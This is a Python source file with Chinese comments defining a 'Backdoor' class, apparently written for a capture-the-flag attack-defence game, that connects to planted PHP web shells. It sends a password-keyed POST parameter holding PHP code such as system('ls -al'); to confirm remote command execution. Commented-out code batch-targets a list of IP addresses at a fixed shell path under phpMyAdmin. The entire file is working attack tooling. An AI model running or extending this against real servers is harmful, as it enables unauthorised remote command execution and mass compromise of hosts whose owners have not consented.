import requests
import re
from urllib.parse import urlparse, parse_qs
from requests.exceptions import RequestException


class Backdoor:
    FileAddress = ''  # 用于保存文件地址
    IP_Address = ''  # 用于保存IP地址
    Url = ''  # 用于保存Url
    scheme = ''  # 协议部分
    netloc = ''  # 域名部分
    path = ''  # 地址部分
    query = ''  # 查询部分
    first_param_name = ''  # 查询键
    first_param_value = ''  # 查询值
    password = ''  # 连接密码
    cmd = ''  # 执行命令
    post_data = {}

# 这里进行文件地址的读取
# 请将IP按xxx.xxx.xxx.xxx格式，一行一条存入该文件即可

    def readFileAddress(self):
        try:
            self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
        except Exception as e:
            print("文件地址获取发生错误", str(e))

# 这里对连接进行测试，成功将会保存该Url为模板
# ls -al 测试木马文件目录，有返回值则木马有效
# 超时时间默认两秒

    def testUrl(self, Url="", password="admin", automatic="y", timeoutvalue=2):
        self.password = password
        self.cmd = "system('ls -al');"
        self.post_data = self.setpostvelue()
        try:
            if Url == "":
                self.Url = re.sub(r"\"", "", input("请输入链接： "))
            else:
                self.Url = Url

            # 发送HTTP请求，设置连接超时为2秒
            response = requests.post(
                self.Url, data=self.post_data, timeout=timeoutvalue)

            # 检查响应状态码
            if response.status_code == 200 and response.text:
                print("连接成功")
                # 这里可以切换自动检测，手动检测
            else:
                print("密码错误")
        # 错误响应
        except RequestException as e:
            if "timeout" in str(e):
                print("连接失败: 失败原因连接时间过长")
            else:
                print("连接失败:", str(e))

# 这里直接传入木马
# 连接Url支持参数密码如：?pass=qwer

    def analyzeUrl(self):
        if self.Url == "":
            print("先测试Url")
        # 使用urlparse解析Url
        parsed_url = urlparse(self.Url)

        # 提取Url的各个部分
        self.scheme = parsed_url.scheme  # 协议部分
        self.netloc = parsed_url.netloc  # 域名部分
        self.path = parsed_url.path      # 地址部分
        self.query = parsed_url.query    # 查询部分

        # 使用parse_qs解析查询字符串
        query_dict = parse_qs(self.query)

        # 获取查询参数的值
        if query_dict:
            self.first_param_name = list(query_dict.keys())[0]
            self.first_param_value = query_dict[self.first_param_name][0]

# 打印各个属性

    def printAll(self):
        print("用于保存文件地址: ", self.FileAddress)
        print("用于保存IP地址: ", self.IP_Address)
        print("用于保存Url: ", self.Url)
        print("协议部分: ", self.scheme)
        print("域名部分: ", self.netloc)
        print("地址部分: ", self.path)
        print("查询部分: ", self.query)
        print("查询键: ", self.first_param_name)
        print("查询值: ", self.first_param_value)
        print("连接密码: ", self.password)
        print("执行命令: ", self.cmd)


# 设置post参数

    def setpostvelue(self):
        return {self.password: self.cmd}


# def gat_IP_Address(self):
#     self.readFileAddress()
#     with open(self.FileAddress, mode="r", encoding="utf-8") as f:
#         for i in f.readlines():  # 读取文件的所有行
#             url = 'http://' + i.strip()
#             url_path = '/phpMyAdmin/js/config/one.php'
#             try:
#                 response = requests.post(
#                     url + url_path, data=self.post_data, timeout=2)
#                 response.raise_for_status()
#             except requests.exceptions.Timeout:
#                 print("失败：请求超时")
#             except requests.exceptions.RequestException as e:
#                 print("失败：", e)
#             else:
#                 print(response.text)
# def getflag(self):#     # 实现获取标志的代码
